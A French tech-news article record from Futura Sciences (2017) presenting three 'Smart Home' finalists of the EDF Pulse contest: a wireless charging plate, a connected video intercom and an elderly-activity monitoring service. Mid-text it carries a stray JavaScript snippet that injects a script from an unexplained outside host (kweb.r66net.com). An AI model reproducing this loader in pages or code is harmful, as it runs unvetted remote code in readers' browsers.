{"title": "Innovations Maison : recharge sans fil, interphone vidéo connecté et vidéosurveillance", "newspaper": "Futura Sciences", "author": "Par la rédaction de Futura", "date_publi": "25/08/2017", "content": "Pour le choix des lauréats 2017 des prix EDF Pulse, l'heure est venue de départager les finalistes. Ils sont douze en tout, sur 529 candidats. Découvrez les trois projets dans la catégorie « Smart Home ». L'un veut recharger nos mobiles sans fil ni complications, l'autre invente un interphone-visiophone multifonctions et le troisième relie la maison d'une personne âgée à sa famille. N'oubliez pas que vous pouvez voter pour le Prix du public.  Les finalistes Smart Home du concours EDF Pulse 2017                       Nous rencontrons ici les trois finalistes du concours EDF Pulse 2017 dans la catégorie « Smart Home ». Energy Square veut recharger nos mobiles sans fil ni complications. Fenotek invente l'interphone-visiophone multifonctions Hi). Avec Howz, le Britannique Intelesant suit les consommations électriques. Dans un premier temps, Howz identifie les habitudes de vie et les comportements récurrents à travers l’usage quotidien d’appareils électriques (éclairage, bouilloire, grille-pain, etc.). Le système pourra alerter les proches en cas de détection d’un comportement inhabituel (baisse d’activité, etc.). Ils pourront aussi, et surtout, être rassurés, de même que la personne âgée « qui s’inquiète de ce que ses proches s’inquiètent pour elle ».                                       Cette quatrième édition des  prix EDF Pulse  réunit 529 entreprises, chacune ayant posé sa candidature dans l'une des quatre catégories de la saison 2017 : Smart Home, Smart City, Smart Health et la nouveauté de cette année, Smart Business. Les quatre comités d'experts qui ont étudié ces dossiers ont retenu douze finalistes, soit trois par catégorie. C'est un Grand Jury, réuni en septembre, qui désignera les quatre lauréats, un par catégorie. Un cinquième prix sera décerné par le public, au terme d'une campagne de votes de plusieurs semaines. Voir aussi : EDF Pulse 2017 : découvrez les 12 nominés de l'innovation... et votez Le concours EDF Pulse attire de nombreuses entreprises depuis maintenant quatre ans. © EDF                               Des innovations au-delà de la domotique Dans la catégorie « Smart Home », le thème des  innovations  en lice est l'habitat, individuel ou collectif. Les critères de ce prix EDF Pulse se concentrent sur le confort, la sécurité, l'autonomie et l'économie. Dans cette catégorie, près d'une centaine d'entreprises, d'Europe et d'ailleurs, ont proposé leurs projets, souvent basés sur la connectivité.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les inventions couvrent de nombreux domaines, classiques de la  domotique  comme le contrôle du chauffage ou des accès, et, plus originaux, comme le suivi de la qualité de l' air  ou l'aide à l'autonomie des personnes âgées. Les comités d'experts ont retenu trois finalistes : Energy Square  : un système de  recharge sans fil  d'appareils mobiles simple à l'extrême, puisqu'il suffit de poser le téléphone ou la  tablette  sur cette plaque à grands carreaux (sans risque car elle est même lavable à l'eau). Hi)  : un  interphone  connecté et multifonctions, réalisé par  Fenotek , qui peut se commander à distance, visualiser le visiteur sur un téléphone, surveiller la maison ou permettre l'accès à des tiers à l'aide d'un  code QR . Howz  : un outil d'aide pour les personnes âgées et leur famille, conçu par le Britannique  Intelesant , qui surveille l'activité (ouvertures des  portes , utilisation de l'électricité,  mouvements ...) et transmet ses informations aux proches, pour rassurer tout le monde. Futura a rencontré ces finalistes, tous des passionnés inventifs et entreprenants, et nous raconterons prochainement leurs idées et leurs démarches. En découvrant ces innovateurs, vous pourrez plus facilement (quoique le choix sera délicat) voter pour le Prix du public, qui sera remis en septembre. ", "theme": "tech"}